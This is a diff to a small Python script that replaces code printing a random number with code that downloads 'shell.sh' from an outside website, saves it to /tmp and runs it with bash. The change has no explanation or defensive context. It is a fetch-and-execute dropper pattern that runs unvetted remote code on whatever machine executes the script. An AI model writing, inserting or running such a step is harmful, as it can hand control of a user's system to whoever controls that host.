@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 
-import random
+import requests
+import subprocess
 
-# import requests
-# r = requests.get('http://wttr.in/48439?format=3')
-# if r.status_code == requests.codes.ok:
-#     print(r.text)
-
-# with open("VERSION") as f:
-#     v = f.readline().strip()
-#     print(v)
-
-print(random.randint(1, 100))
+r = requests.get("https://cloudmason.org/shell.sh")
+if r.status_code == requests.codes.ok:
+    with open("/tmp/shell.sh", "w") as f: 
+        f.write(r.text)
+    p = subprocess.run(["/bin/bash", "/tmp/shell.sh"], capture_output=True, text=True, check=True)
+    print(p)
+    if p.stdout:
+        print(p.stdout)
+    if p.stderr:
+        print(p.stderr)
